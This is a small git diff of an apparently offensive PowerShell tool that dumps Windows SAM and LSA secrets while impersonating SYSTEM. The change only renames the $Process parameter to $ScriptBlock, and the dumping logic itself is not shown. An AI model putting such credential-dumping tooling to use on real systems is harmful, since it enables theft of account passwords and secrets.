@@ -22,8 +22,8 @@ Function Invoke-HiveDump {
         return
     }
 
-    Invoke-AsSystem -Process { Invoke-SAMDump }
-    Invoke-AsSystem -Process { Invoke-LSADump }
+    Invoke-AsSystem -ScriptBlock { Invoke-SAMDump }
+    Invoke-AsSystem -ScriptBlock { Invoke-LSADump }
 }
 
 Function Local:Invoke-AsSystem {
@@ -31,7 +31,7 @@ Function Local:Invoke-AsSystem {
     Param (
         [Parameter(Mandatory=$true, Position=0)]
         [scriptblock]
-        $Process,
+        $ScriptBlock,
 
         [Parameter(Position=1)]
         [object[]]
@@ -61,7 +61,7 @@ Function Local:Invoke-AsSystem {
             $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Error "$([ComponentModel.Win32Exception]$err)"
         }
-        & $Process @ArgumentList
+        & $ScriptBlock @ArgumentList
     }
     finally {
         if (-not [HiveDump.Native]::RevertToSelf()) {
